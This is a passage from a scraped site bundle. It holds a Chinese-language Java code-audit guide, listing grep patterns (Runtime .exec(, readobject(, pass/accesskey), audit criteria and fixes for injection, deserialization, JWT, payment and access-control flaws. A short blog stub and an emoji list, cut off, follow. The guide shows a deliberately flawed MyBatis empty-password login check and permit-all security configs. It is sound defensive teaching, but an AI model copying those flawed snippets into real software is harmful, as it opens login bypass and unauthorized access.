原理：服务器执行攻击者传入的恶意命令并执行，导致攻击者可获取服务器权限、敏感信息等。\n\n# 代码搜索范围\n\n*,*.java\n\n# 搜索字符串内容\n\nstring cmd\nstring command\nprocessbuilder\nruntime\n.exec(\nnew scriptenginemanager() // 加载js文件\nnew yaml();  // snakeyaml凡序列化漏洞执行命令\nnew groovyshell(); \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 判断依据\n\n执行命令参数可控，为进行白名单或者过滤操作或不严格，未进行转义特殊字符操作或不严格。\n\n# 修复建议\n\n 1. 非必要不调用系统命令；\n 2. 调用系统命令时不使用前台传入的命令，使用id的方式选择可执行的命令；\n 3. 设置可执行命令白名单，不允许使用 && || & | ;等命令并列的特殊字符；\n 4. 控制执行命令用户权限；\n 5. 命令执行漏洞在实际工作中发现的较少。\n\n\n# 不安全的反序列化\n\n> 原理：服务器对用户可控的数据进行反序列化时，攻击者可构造恶意的反序列化对象，将有害数据传递到应用代码中。\n> \n> java反序列化漏洞在java安全中占据重要的地位，一些通用组件的漏洞往往是由反序列化漏洞引起的。但在实际工作中，开发人员进行反序列化操作可能性较小。\n\n# 代码搜索范围\n\n*、*.java\n\n# 搜索字符串内容\n\nreadobject(\n\n\n1\n\n\n# 判断依据\n\n 1. 反序列化数据可控，执行反序列化操作，反序列化对象readobject方法中存在危险操作。\n 2. 通常情况下是三方组件中存在漏洞，导致反序列化。因此只需要判断项目中是否引用了包含漏洞的三方组件版本即可，如果引入了则建议升级，如果无法升级，则看是否满足利用条件，并利用waf拦截相关的请求。\n\n# 修复建议\n\n 1. 设置可反序列化的类白名单，不允许名单外的类进行反序列化；\n 2. 使用安全的三方组件。\n\n\n# url跳转\n\n> 原理：客户端用户可控跳转url地址，攻击者在服务端发起跳转时指定恶意地址，可跳转到钓鱼或其他违法违规页面。\n\n# 搜索范围\n\n* ， *.java\n\n# 搜索字符串内容\n\nstring url\nstring returnurl\nstring returnpath\nstring path\nsendredirect\nforword\nredirect:\n.setheader("refresh"\n.setstatus(302)\n.setheader("location"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 判断依据\n\n 1. 跳转的url地址用户可控，未经过过滤判断或过滤判断不严格；\n 2. url跳转漏洞可配合ssrf漏洞，当ssrf不完全校验地址时，可以利用url跳转漏洞请求跳转之后的地址。\n\n# 修复建议\n\n 1. 设置跳转地址白名单\n 2. 如果跳转地址是固定的，则可以使用id索引地址，防止用户直接传入；\n 3. 先生成跳转链接及其签名，跳转前进行签名验证。\n\n\n# 硬编码\n\n> 原理：当用户可以获取到程序源代码或者经过其他漏洞获取到程序源代码时，硬编码的密码等敏感信息可直接被用户获取。\n\n# 搜索范围\n\n* 连同前端代码一起搜索，可能搜索到前端认证用户密码、云服务id和key等信息。\n\n# 搜索字符串内容\n\npass\npwd\nkey\naccesskeyid\naccesskey\naccessid\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 判断依据\n\n代码中有明文的密码、密钥等信息（通常不包含单元测试java文件）\n\n# 修复建议\n\n 1. 加密存储到配置文件中，然后代码中读取配置文件获取密码、密钥；\n 2. 使用配置中心或者存储到数据库中。\n\n\n# 不安全的加密方式\n\n> 原理：不安全的加密方式包含使用不安全的加密算法导致攻击者对加密数据可逆，或者使用不符合要求长度的密钥进行加密操作。\n\n# 搜索范围\n\n*.java、*.properties、*.yaml\n\n# 搜索字符串内容\n\ndes\ndesutil\nsha1\necb\nrsa // 看密钥长度\nmd5 // 存储数据需要加盐\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 判断依据\n\n 1. 使用不安全的加密方式加密数据；\n 2. 安全的加密方式密钥长度不符合要求\n 3. 开发人员经常在前端使用aes加密数据发送到后端，因为aes是对称加密的，前端必定存在aes密钥（js或者请求获取）导致数据加密传输形同虚设；\n 4. 有些开发人员为了测试方便，会预留加解密接口，通常名称为decrypt和encrypt或者jiami和jiemi；\n 5. base64不是加密方式，曾经见过请求头中的认证信息是base64编码的用户名和密码串。\n\n# 修复建议\n\n 1. 使用安全的非对称加密算法\n 2. 加密算法密钥长度应该符合安全要求\n 3. 使用md5加密存储密码信息时应当加盐（建议使用表中uuid、createdate等具有迷惑性质的随机盐）\n\n\n# 日志伪造\n\n> 原理：将未经验证的用户输入写入日志文件可致使攻击者伪造日志条目或将恶意信息内容注入日志。\n\n# 搜索范围\n\n*.java\n\n# 搜索字符串内容\n\n.info(\n.error(\n.debug(\n.warn(\n\n\n1\n2\n3\n4\n\n\n# 判断依据\n\n 1. 日志打印内容可控；\n 2. 日志内容未过滤\n\n# 修复建议\n\n 1. 日志内容固定；\n 2. 过滤打印内容，设置可打印字符白名单，不允许打印换行\\n\n\n\n# 敏感信息泄露\n\n> 原理：敏感信息泄露包含系统敏感信息泄露和用户敏感信息泄露。\n\n系统的敏感信息泄露通常由系统执行代码异常导致的，由于未设置统一的报错页面，可能直接将报错信息返回给浏览器，其中可能包含某些配置、调用栈、sql语句、路径等。\n\n用户敏感信息泄露通常是由服务器返回较多的用户信息（密码）或者返回未脱敏的数据导致的。\n\n# 搜索范围\n\n*.java\n\n# 搜索字符串内容\n\npassword\npass\naddress\nidno\nphoneno\n……\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 判断依据\n\n 1. 是否存在统一报错返回；\n 2. 返回结果是否包含敏感内容。\n 3. 对于大型项目来说，返回的结果往往被封装成实体后返回，因此可以查找返回的结果封装中是否包含以上的字段，如果包含则追踪到对应的位置，查看是否进行脱敏或者清空。\n\n# 修复建议\n\n 1. 定制统一报错页面或者统一报错json返回；\n 2. 只返回必要的信息，密码等字段不应返回，敏感字段脱敏返回。\n\n\n# 安全配置错误\n\n> 原理：由于开发在配置组件时的无意识或者方便使用，导致攻击者可以未授权访问第三方组件，导致信息泄露。\n\n# 发现方式\n\n看pom文件或者lib中是否存在可能有配置错误的组件，然后查看对应的配置。\n\n常见的有可能存在问题的组件如下：swagger 、shiro、springsecurity、druid、spring boot actuator\n\n相对于白盒而言，这种配置错误导致的未授权问题黑盒审计更为方便。批量访问对应url判断是否能够访问成功即可。\n\n# 修复建议\n\n 1. swagger不建议对公网开放；\n 2. 如果确实存在开放的必要，则必须进行身份认证和授权操作；\n 3. 可以配置密码密钥的组件需要配置密码和密钥，并保证密钥的复杂度。\n\n\n# xss\n\n> 原理：攻击者利用恶意构造的js代码使浏览器在解析时产生歧义，达到攻击者攻击用户浏览器的目的。\n\n# 发现方式\n\nxss漏洞覆盖范围较广，服务端向外发送数据的场景都有可能产生xss。xss还和前端使用的框架相关，有些框架对于xss有很好的防护性。因此白盒发现xss较为复杂，可以看业务逻辑的位置辅助看看，发现存在可能性的位置后，配合黑盒在具体的站点上尝试是否可以成功。也可以看看是否存在过滤器，对xss进行实体化转义或者过滤，转义或者过滤是否严谨和规范。\n\n# 修复建议\n\n 1. html实体化\n 2. cookie设置httponly\n 3. 过滤特殊字符、过滤事件标签\n\n\n# 业务逻辑漏洞审计方式\n\n> 业务逻辑漏洞比较复杂，包含业务的各个方面，并且基本没有可用的搜索字符串和定位方式，往往需要通读功能点代码，理解某种功能的操作流程，发现其中的安全风险。\n\n\n# 认证相关\n\n# 注册逻辑\n\n任意用户注册\n\n任意用户注册往往由于未要求用户提供手机号、邮箱等可确定归属的身份信息、未对用户提供的身份信息进行验证或者身份信息验证的流程可绕过。从代码上的表现就是存在手机号和邮箱的验证、手机号邮箱的验证和插入用户表的操作需要一次完成或者存在前后的校验，防止越过请求直接发起插入用户数据操作。\n\n注册覆盖原用户\n\n注册覆盖原用户通常发生在注册和修改用户信息接口复用的情况下，或者用户在注册时未验证新注册的用户在当前系统中是否存在，如果重复注册用户，可能存在原用户信息泄露、权限接管等风险。代码中主要看是否校验用户名的可用性。\n\n密码明文存储\n\n在安全开发规范中要求密码需要加密存储，通常开发人员使用md5加盐存储密码信息。代码中如果未发现加密存储行为则可能有明文密码存储的风险。另外有可能前台传过来的密码本身就是加密的，但是并不提倡这种方式，因为前台浏览器端的加密是用户实际可控的。\n\n密码盐值硬编码\n\n在密码存储时，建议使用随机盐值进行加密。使用统一的盐加密时，会降低存储密码的安全性。可用的方案是数据表中添加一列盐值字段，或者使用现有的不可变的数据库字段信息（比如：uuid、createtime）进行加盐，使用可修改内容加盐将导致认证失败。\n\n密码复杂度低\n\n前端验证密码复杂度，后端不验证时可绕过密码复杂度要求。需要后端进行密码复杂度的校验。\n\n# 登录逻辑\n\n任意用户登录\n\n任意用户登录指的是服务端不验证用户密码。代码上的表现为前台未传入用户密码信息，或者传入密码信息之后，未使用用户名、密码绑定查询用户信息。这种方式将导致任意用户登录。\n\n空口令登录\n\n空口令登录指的是用户在需要输入用户名密码时，传递了空字符串或者未传递该参数。在以mybaits为例，在查询数据库时如果开发采用如下的写法，将导致密码为空或者空字符串时，不带入查询。\n\n<if test="password != null and password != \'\'">\n  and password = #{password}\n</if>\n\n\n1\n2\n3\n\n\n登录爆破\n\n在进行用户登录时未进行同一用户、同一ip、同一会话的用户登录次数限制或者未使用验证码，可导致登录爆破。解决方案可选：\n\n * 使用安全的人机交互验证方式\n * 对同一用户的多次登录尝试做阻断（封锁账号、验证绑定手机号）\n * 对同一ip多次登录失败的尝试进行封禁\n * 针对同一回话多次账户登录尝试做阻断\n * 设置风险用户名单，风险用户登录时需要多因子验证\n\n用户名枚举\n\n用户名枚举主要发生在登录时结果返回、注册前的用户名可用性查询、找回密码前的用户判断、**未授权用户信息查询（较少）**的接口返回。解决方案是登录失败或者成功、找回密码用户判断返回统一的信息。如登录失败可统一返回“用户名或密码错误。”，注册前或者找回密码的用户名判断添加验证码。针对未授权用户信息查询一般情况下不允许存在这种接口，要求鉴权或下线。\n\n登录验证不安全\n\n弱口令登录一般有几种情况：\n\n * 用户名密码在前端提示框中有placeholder的留存\n * 用户名密码前端验证\n * 用户名密码后端写死到代码中\n\n解决方案是不允许前端进行的用户验证（往往前端进行用户验证会对应后面整个系统操作的未授权或者越权），用户名密码建议存储到数据库，不允许硬编码到代码中验证，前端输入框提示中不允许提示用户名、密码信息。\n\nbase64编码传输\n\n为防止中间人攻击，在前端登录请求中需要对用户名密码（密码必须加密）信息进行加密传输，但是很多开发误认为base64是一种加密方式。解决方法是使用非对称加密的加密方式，前端使用公钥进行加密，后端使用私钥解密。根据系统所处位置和重要程度，也可以选用对称密钥加密，视情况而定。\n\n恶意账号锁定\n\n很多系统对于登录爆破有账号多次登录的封号处理机制，这种机制容易导致账号的恶意锁定，攻击者发起大量的登录请求，批量锁定大量账号。解决方法：\n\n * 登录操作添加验证码，提高攻击复杂度\n * 对于同一ip地址的多次登录尝试进行ip封禁\n * 设置账号的常用ip，非常用ip登录可验证绑定手机的验证码\n\n# 注销逻辑\n\n注销未销毁session\n\n直接定位到session注销的接口，查看是否有session.removeattribute("user")类似的销毁操作。经常发现开发人员为了方便，直接在该接口中跳转到了登录页面，不进行登录信息的销毁。如果是使用jwt做认证的系统，注销登录往往是前端的操作，关于jwt的安全性问题另外讨论。\n\n任意用户注销\n\n任意用户注销是因为用户发起注销请求时，传入了用户的身份信息，常见请求地址如：/user/logout?userid=10001，或者将userid信息明文设置在cookie中，只需要修改userid就可以注销其他用户。解决方法是不传递任何userid信息，直接从请求中获取session，设置session销毁。\n\n# 密码找回逻辑\n\n任意用户密码重置\n\n任意用户密码重置往往是由于未验证用户手机号、邮箱，或者用户手机号、邮箱验证可绕过、验证码复杂度低可爆破。通常在代码中的表现是用户密码重置验证手机号验证码和重新设置密码的请求分离、前后没有关联性，导致攻击者可以跳过验证步骤，直接进行密码重置操作。对于验证码爆破，可设置三次验证错误销毁。\n\n密码找回用户名枚举\n\n密码找回位置的用户名枚举和登录位置的用户名枚举类似，在进行密码找回之前需要判断用户名是否存在。可以采用添加验证码的方式，或者使用用户绑定的手机号发送短信验证码作为密码找回的依据。\n\n# jwt安全问题\n\njwt时效性\n\n在生成下发jwttoken信息时，可以设置jwt的有效时间，有效时间设置不建议过长。由于jwttoken生成之后无状态，通常情况下服务器不存储jwttoken信息，因此由于jwt的时效性问题导致修改用户信息后，jwt内的信息无法实时的更新，可能导致越权等的问题。解决方法是服务端将jwttoken存储到redis中，更改信息后，将原本的token信息从redis中清除，放入新token，每次请求判断用户携带的token是否在缓存中。\n\njwt中包含敏感信息\n\njwt是一串有.分隔的三部分组成的字符串，其中第二部分中可以设置用户相关的信息，该部分信息使用base64编码。如果其中包含了一些敏感的个人信息（密码、手机号、身份证号、银行卡号等）很容易被他人获取。因此不要在jwt中保存过多的个人相关信息，不要在jwt中存储敏感信息。\n\njwt未校验签名\n\n开发人员在获取jwt中的信息时通常使用的是开发人员编写的jwtutil或者使用三方的jwt工具，在获取jwt信息时可能出现不验证jwt签名直接获取的情况。攻击者可以伪造jwt第二部分，越权操作他人账号。这种情况比较少，工作中遇到过一次，但是发现了就是大问题。\n\n弱密钥爆破\n\njwt的密钥如果复杂度不够可能存在爆破的可能。\n\njwt注销的解决方案\n\n常见的解决方案如下：\n\n * 前端操作直接删除token（无为而治，但令牌仍然有效）\n * token作为key存储到redis中，注销删除token\n * 在jwt中存储token的版本信息，redis中存储jwt版本信息和用户绑定，版本不相同则不可用（方便用户踢出下线）\n * 设置短时间的token（时间较短可能导致频繁登录）\n * 黑名单校验，对于所有注销的token加入黑名单，然后根据token过期时间，过期后移出黑名单。\n\n# cookie安全问题\n\n明文信息修改导致越权\n\n有些开发人员将用户身份信息、用户权限信息直接明文存储到cookie中，修改cookie中的明文信息后，然后后端从cookie中读取信息，导致越权。不利用cookie存储数据，所有数据均在服务端存储。\n\nxss\n\n比较常见的cookie安全问题，需要设置httponly，cookie.sethttponly(true);。\n\n不安全的反序列化\n\nshiro在cookie中加密存储了信息，解密后反序列化。如果拿到了shiro的密钥，则可以构造恶意的反序列化的对象。\n\n\n# 支付相关\n\n越权操作订单（增删改查）\n\n越权操作订单通常出现在订单中心位置，包括查看订单详情、下单、取消订单、删除订单、修改订单等。主要特征是服务端使用用户传入的orderid单一字段进行操作，未判断当前orderid是否属于当前用户。通常做法是获取到orderid之后，从用户信息中取userid，然后使用两个字段操作数据库。\n\n金额问题（0.01支付、负件数商品、活动优惠薅羊毛）\n\n金额问题比较复杂，如果涉及到积分、优惠、红包、满减等特殊活动，需要充分了解活动的机制、活动对象的要求。这部分和业务紧密联系，例如：积分业务和支付业务分离，当用户发起退款后，积分未退款，因此可以刷取积分等。对于0.01、负数量商品等需要看代码中总金额的计算方式是否合理，是否对商品数量做校验，总金额不要从前台传入，由后台计算获取。\n\n对于某些只能参与一次的情况，需要对关键操作加锁，防止条件竞争并发薅羊毛。\n\n\n# 权限相关\n\n未授权访问\n\n在使用某些权限控制框架时，开发人员为了开发的方便，直接设置了全部接口的允许访问（或设置了开发的接口url允许访问），后期开发完毕之后忘记修改，导致未授权。或者在使用注解进行权限控制时，忘记给某些方法上添加注解，都可能导致未授权访问。\n\n// shiro\nmap.put("/**","anon");\n//spring security\n.anyrequest().permitall() \n\n\n1\n2\n3\n4\n\n\n还有一种情况是开发者自己开发了拦截器，当满足某些条件（请求头包含某个字段、请求url地址以xx开头等）不需要认证，也有可能出现未授权访问的问题。\n\n越权操作\n\n越权操作和订单越权类似，关键特征都是信任前端传入的id参数，直接利用id进行查询等操作。\n\n信任cookie中设置的rolename=admin，也可能导致垂直越权问题。\n\n永远不相信前台传入的数据，对于关键的数据（userid、roleid）等，由服务端获取。\n\n\n# 遗留问题\n\n# 历史遗留接口\n\n历史遗留接口包含应下线但是未下线的接口、无用功能、到期的活动等。开发在修复漏洞时可能会重新开一个新的接口，但是存在问题的接口可能仍然存在未下线。这点在移动端比较常见，或许因为兼容老版本app，导致存在问题的接口仍然存在。这种问题的发现依赖于对于系统的了解程度和接口的管理水平。平时在审计时，多关注同文件的其他接口。\n\n# 测试（后门）对外暴露\n\n开发为了测试方便直接留存权限较大的后门。包括数据库操作、文件操作、redis操作等。还有一些接口用于生成测试数据、添加测试用户，加解密等操作。这类接口对外开放，有很大的安全隐患。接口名称多为/test/xxx或者/encrypt、/decrypt等。一般不允许有这类接口未授权对外开放。\n\n\n# 验证码类\n\n验证码的问题主要包含复杂度低、验证码重用、验证码可绕过、短信（电话）轰炸、不同业务短信验证码共用等。\n\n验证码分两类，短信（电话）验证码和人机交互验证码。总体来说应满足如下的要求：\n\n * 验证码复杂度高\n * 验证码多次尝试销毁\n * 使用过的短信（电话）验证码销毁\n * 是否有验证码不可通过前台控制\n * 图形验证码尽量复杂不可被识别\n * 图形验证码图片大小不可被前台控制\n * 短信（电话）验证码要有针对手机号、会话、ip等多种防轰炸的机制，不同业务防轰炸信息同步。\n * 不同业务的短信验证码尽量不通用\n * ……\n\n\n# 三方组件漏洞审计方式\n\n * 依靠人工查看项目中使用的依赖\n   \n   * 优点：不需要借助工具，代码审计的时候过一下依赖包，对于引入了相关依赖但未使用的情况比较准确。可以对漏洞具体的使用条件进行判断。\n   * 缺点：依赖个人经验，容易遗漏；\n\n * 通过一些第三方依赖检查功能\n   \n   * 优点：全面、速度快、更新及时\n   * 缺点：不够准确\n\n * 自己开发工具\n   \n   * 优点：顺手，可根据自己的想法改进，提升安全工具开发的能力；\n   * 缺点：重复造轮子，开发和维护的成本较高；（如果是利用第三方接口的方式，则接口更改，对应逻辑也要更改。如果是自己开发接口，则依赖组件漏洞信息的管理和收集）\n   * 思路：通过解析pom.xml文件，获取全部引入的依赖，调用接口判断是否存在漏洞。\n\n\n# 参考资料\n\n 1. 污点分析技术的原理和实践应用\n 2. java代码审计之xxe与ssrf\n 3. 攻击jwt的一些方法\n 4. 浅谈cookie和cookie安全',charsets:{cjk:!0},lastUpdated:"2022/07/26, 06:58:43",lastUpdatedTimestamp:1658818723e3},{title:"天气炎热，小站空调已开放！",frontmatter:{title:"天气炎热，小站空调已开放！",date:"2022-06-23T00:00:00.000Z",permalink:"/life/other/airconditioning",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","前端","前端基础"],sidebar:!1,article:!1,tags:["HTML","CSS"],readingShow:"top"},regularPath:"/03.%E7%94%9F%E6%B4%BB/300.%E5%85%B6%E4%BB%96/01.%E5%A4%A9%E6%B0%94%E7%82%8E%E7%83%AD%E5%BC%80%E4%B8%AA%E7%A9%BA%E8%B0%83%E5%90%A7.html",relativePath:"03.生活/300.其他/01.天气炎热开个空调吧.md",key:"v-1a41a8d0",path:"/life/other/airconditioning/",headersStr:null,content:"# 天气炎热，小站空调已开放！",normalizedContent:"# 天气炎热，小站空调已开放！",charsets:{cjk:!0},lastUpdated:"2022/06/23, 01:35:59",lastUpdatedTimestamp:1655948159e3},{title:"Emoji表情集合",frontmatter:{title:"Emoji表情集合",date:"2000-01-01T00:00:00.000Z",permalink:"/more/blog/emoji",categories:["更多","博客搭建"],tags:[null],readingShow:"top"},regularPath:"/04.%E6%9B%B4%E5%A4%9A/400.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/00.emoji.html",relativePath:"04.更多/400.博客搭建/00.emoji.md",key:"v-3553020e",path:"/more/blog/emoji/",headers:[{level:2,title:"emoji分类",slug:"emoji分类",normalizedTitle:"emoji分类",charIndex:14},{level:3,title:"People",slug:"people",normalizedTitle:"people",charIndex:26},{level:3,title:"Nature",slug:"nature",normalizedTitle:"nature",charIndex:4978},{level:3,title:"Objects",slug:"objects",normalizedTitle:"objects",charIndex:8044},{level:3,title:"Places",slug:"places",normalizedTitle:"places",charIndex:15603},{level:3,title:"Symbols",slug:"symbols",normalizedTitle:"symbols",charIndex:18286}],headersStr:"emoji分类 People Nature Objects Places Symbols",content:"# emoji表情\n\n\n# emoji分类\n\n\n# People\n\n😱 :SCREAM:                         😄 :SMILE:                          😆 :LAUGHING:\n😊 :blush:                          😃 :smiley:                         ☺️ :relaxed:\n😏 :smirk:                          😍 :heart_eyes:                     😘 :kissing_heart:\n😚 :kissing_closed_eyes:            😳 :flushed:                        😌 :relieved:\n😆 :satisfied:                      😁 :grin:                           😉 :wink:\n😜 :stuck_out_tongue_winking_eye:   😝 :stuck_out_tongue_closed_eyes:   😀 :grinning:\n😗 :kissing:                        😙 :kissing_smiling_eyes:           😛 :stuck_out_tongue:\n😴 :sleeping:                       😟 :worried:                        😦 :frowning:\n😧 :anguished:                      😮 :open_mouth:                     😬 :grimacing:\n😕 :confused:                       😯 :hushed:                         😑 :expressionless:\n😒 :unamused:                       😅 :sweat_smile:                    😓 :sweat:\n😥 :disappointed_relieved:          😩 :weary:                          😔 :pensive:\n😞 :disappointed:                   😖 :confounded:                     😨 :fearful:\n😰 :cold_sweat:                     😣 :persevere:                      😢 :cry:\n😭 :sob:                            😂 :joy:                            😲 :astonished:\n😎 :sunglasses:                     😵 :dizzy_face:                     😫 :tired_face:\n😠 :angry:                          😡 :rage:                           😤 :triumph:\n😪 :sleepy:                         😋 :yum:                            😷 :mask:\n👿 :imp:                            😐 :neutral_face:                   😶 :no_mouth:\n\n                                                               \n😈 :smiling_imp:                😇 :innocent:                  👽 :alien:\n😇 :innocent:                   💧 :droplet:                   💛 :yellow_heart:\n💙 :blue_heart:                 💜 :purple_heart:              ❤️ :heart:\n💚 :green_heart:                💔 :broken_heart:              💓 :heartbeat:\n💗 :heartpulse:                 💕 :two_hearts:                💞 :revolving_hearts:\n💘 :cupid:                      💖 :sparkling_heart:           ✨ :sparkles:\n⭐️ :star:                       🌟 :star2:                     💫 :dizzy:\n💥 :boom:                       💥 :collision:                 💢 :anger:\n❗️ :exclamation:                ❓ :question:                   ❕ :grey_exclamation:\n❔ :grey_question:               💤 :zzz:                       💨 :dash:\n💦 :sweat_drops:                🎶 :notes:                     🎵 :musical_note:\n🔥 :fire:                       💩 :hankey:                    💩 :poop:\n💩 :shit:                       👍 :+1:                        👍 :thumbsup:\n👎 :-1:                         👎 :thumbsdown:                👌 :ok_hand:\n👊 :punch:                      👊 :facepunch:                 ✊ :fist:\n✌️ :v:                          👋 :wave:                      ✋ :hand:\n✋ :raised_hand:                 👐 :open_hands:                ☝️ :point_up:\n👇 :point_down:                 👈 :point_left:                👉 :point_right:\n🙌 :raised_hands:               🙏 :pray:                      👆 :point_up_2:\n👏 :clap:                       💪 :muscle:                    🤘 :metal:\n🖕 :fu:                         🚶 :walking:                   🏃 :runner:\n🏃 :running:                    👫 :couple:                    👪 :family:\n👬 :two_men_holding_hands:      👭 :two_women_holding_hands:   💃 :dancer:\n👯 :dancers:                    🙆 :ok_woman:                  🙅 :no_good:\n💁 :information_desk_person:    🙋 :raising_hand:              👰 :bride_with_veil:\n🙎 :person_with_pouting_face:   🙍 :person_frowning:           🙇 :bow:\n💑 :couple_with_heart:          💆 :massage:                   👥 :busts_in_silhouette:\n💇 :haircut:                    💅 :nail_care:                 👦 :boy:\n👧 :girl:                       👩 :woman:                     👨 :man:\n👶 :baby:                       👵 :older_woman:               👴 :older_man:\n👱 :person_with_blond_hair:     👲 :man_with_gua_pi_mao:       👳 :man_with_turban:\n👷 :construction_worker:        👮 :cop:                       👼 :angel:\n👸 :princess:                   😺 :smiley_cat:                😸 :smile_cat:\n😻 :heart_eyes_cat:             😽 :kissing_cat:               😼 :smirk_cat:\n🙀 :scream_cat:                 😿 :crying_cat_face:           😹 :joy_cat:\n😾 :pouting_cat:                👹 :japanese_ogre:             👺 :japanese_goblin:\n🙈 :see_no_evil:                🙉 :hear_no_evil:              🙊 :speak_no_evil:\n💂 :guardsman:                  💀 :skull:                     🐾 :feet:\n👄 :lips:                       💋 :kiss:                      💬 :speech_balloon:\n👂 :ear:                        👀 :eyes:                      👃 :nose:\n👅 :tongue:                     💌 :love_letter:               👤 :bust_in_silhouette:\n👥 :busts_in_silhouette:        💭 :thought_balloon:           \n\n\n# Nature\n\n                                                                \n☀️ :sunny:                          ☔️ :umbrella:               ☁️ :cloud:\n❄️ :snowflake:                      ⛄️ :snowman:                ⚡️ :zap:\n🌀 :cyclone:                        🌁 :foggy:                  🌊 :ocean:\n🐱 :cat:                            🐶 :dog:                    🐭 :mouse:\n🐹 :hamster:                        🐰 :rabbit:                 🐺 :wolf:\n🐸 :frog:                           🐯 :tiger:                  🐨 :koala:\n🐻 :bear:                           🐷 :pig:                    🐽 :pig_nose:\n🐮 :cow:                            🐗 :boar:                   🐵 :monkey_face:\n🐒 :monkey:                         🐴 :horse:                  🐎 :racehorse:\n🐫 :camel:                          🐑 :sheep:                  🐘 :elephant:\n🐼 :panda_face:                     🐍 :snake:                  🐦 :bird:\n🐤 :baby_chick:                     🐥 :hatched_chick:          🐣 :hatching_chick:\n🐔 :chicken:                        🐧 :penguin:                🐢 :turtle:\n🐛 :bug:                            🐝 :honeybee:               🐜 :ant:\n🐞 :beetle:                         🐌 :snail:                  🐙 :octopus:\n🐠 :tropical_fish:                  🐟 :fish:                   🐳 :whale:\n🐋 :whale2:                         🐬 :dolphin:                🐄 :cow2:\n🐏 :ram:                            🐀 :rat:                    🐃 :water_buffalo:\n🐅 :tiger2:                         🐇 :rabbit2:                🐉 :dragon:\n🐐 :goat:                           🐓 :rooster:                🐕 :dog2:\n🐖 :pig2:                           🐁 :mouse2:                 🐂 :ox:\n🐲 :dragon_face:                    🐡 :blowfish:               🐊 :crocodile:\n🐪 :dromedary_camel:                🐆 :leopard:                🐈 :cat2:\n🐩 :poodle:                         🐾 :paw_prints:             💐 :bouquet:\n🌸 :cherry_blossom:                 🌷 :tulip:                  🍀 :four_leaf_clover:\n🌹 :rose:                           🌻 :sunflower:              🌺 :hibiscus:\n🍁 :maple_leaf:                     🍃 :leaves:                 🍂 :fallen_leaf:\n🌿 :herb:                           🍄 :mushroom:               🌵 :cactus:\n🌴 :palm_tree:                      🌲 :evergreen_tree:         🌳 :deciduous_tree:\n🌰 :chestnut:                       🌱 :seedling:               🌼 :blossom:\n🌾 :ear_of_rice:                    🐚 :shell:                  🌐 :globe_with_meridians:\n🌞 :sun_with_face:                  🌝 :full_moon_with_face:    🌚 :new_moon_with_face:\n🌑 :new_moon:                       🌒 :waxing_crescent_moon:   🌓 :first_quarter_moon:\n🌔 :waxing_gibbous_moon:            🌕 :full_moon:              🌖 :waning_gibbous_moon:\n🌗 :last_quarter_moon:              🌘 :waning_crescent_moon:   🌜 :last_quarter_moon_with_face:\n🌛 :first_quarter_moon_with_face:   🌔 :moon:                   🌍 :earth_africa:\n🌎 :earth_americas:                 🌏 :earth_asia:             🌋 :volcano:\n🌌 :milky_way:                      ⛅️ :partly_sunny:           \n\n\n# Objects\n\n                                                                        \n🎍 :bamboo:                           💝 :gift_heart:                   🎎 :dolls:\n🎒 :school_satchel:                   🎓 :mortar_board:                 🎏 :flags:\n🎆 :fireworks:                        🎇 :sparkler:                     🎐 :wind_chime:\n🎑 :rice_scene:                       🎃 :jack_o_lantern:               👻 :ghost:\n🎅 :santa:                            🎄 :christmas_tree:               🎁 :gift:\n🔔 :bell:                             🔕 :no_bell:                      🎋 :tanabata_tree:\n🎉 :tada:                             🎊 :confetti_ball:                🎈 :balloon:\n🔮 :crystal_ball:                     💿 :cd:                           📀 :dvd:\n💾 :floppy_disk:                      📷 :camera:                       📹 :video_camera:\n🎥 :movie_camera:                     💻 :computer:                     📺 :tv:\n📱 :iphone:                           ☎️ :phone:                        ☎️ :telephone:\n📞 :telephone_receiver:               📟 :pager:                        📠 :fax:\n💽 :minidisc:                         📼 :vhs:                          🔉 :sound:\n🔈 :speaker:                          🔇 :mute:                         📢 :loudspeaker:\n📣 :mega:                             ⌛️ :hourglass:                    ⏳ :hourglass_flowing_sand:\n⏰ :alarm_clock:                       ⌚️ :watch:                        📻 :radio:\n📡 :satellite:                        ➿ :loop:                          🔍 :mag:\n🔎 :mag_right:                        🔓 :unlock:                       🔒 :lock:\n🔏 :lock_with_ink_pen:                🔐 :closed_lock_with_key:         🔑 :key:\n💡 :bulb:                             🔦 :flashlight:                   🔆 :high_brightness:\n🔅 :low_brightness:                   🔌 :electric_plug:                🔋 :battery:\n📲 :calling:                          ✉️ :email:                        📫 :mailbox:\n📮 :postbox:                          🛀 :bath:                         🛁 :bathtub:\n🚿 :shower:                           🚽 :toilet:                       🔧 :wrench:\n🔩 :nut_and_bolt:                     🔨 :hammer:                       💺 :seat:\n💰 :moneybag:                         💴 :yen:                          💵 :dollar:\n💷 :pound:                            💶 :euro:                         💳 :credit_card:\n💸 :money_with_wings:                 📧 :e-mail:                       📥 :inbox_tray:\n📤 :outbox_tray:                      ✉️ :envelope:                     📨 :incoming_envelope:\n📯 :postal_horn:                      📪 :mailbox_closed:               📬 :mailbox_with_mail:\n📭 :mailbox_with_no_mail:             🚪 :door:                         🚬 :smoking:\n💣 :bomb:                             🔫 :gun:                          🔪 :hocho:\n💊 :pill:                             💉 :syringe:                      📄 :page_facing_up:\n📃 :page_with_curl:                   📑 :bookmark_tabs:                📊 :bar_chart:\n📈 :chart_with_upwards_trend:         📉 :chart_with_downwards_trend:   📜 :scroll:\n📋 :clipboard:                        📆 :calendar:                     📅 :date:\n📇 :card_index:                       📁 :file_folder:                  📂 :open_file_folder:\n✂️ :scissors:                         📌 :pushpin:                      📎 :paperclip:\n✒️ :black_nib:                        ✏️ :pencil2:                      📏 :straight_ruler:\n📐 :triangular_ruler:                 📕 :closed_book:                  📗 :green_book:\n📘 :blue_book:                        📙 :orange_book:                  📓 :notebook:\n📔 :notebook_with_decorative_cover:   📒 :ledger:                       📚 :books:\n🔖 :bookmark:                         📛 :name_badge:                   🔬 :microscope:\n🔭 :telescope:                        📰 :newspaper:                    🏈 :football:\n🏀 :basketball:                       ⚽️ :soccer:                       ⚾️ :baseball:\n🎾 :tennis:                           🎱 :8ball:                        🏉 :rugby_football:\n🎳 :bowling:                          ⛳️ :golf:                         🚵 :mountain_bicyclist:\n🚴 :bicyclist:                        🏇 :horse_racing:                 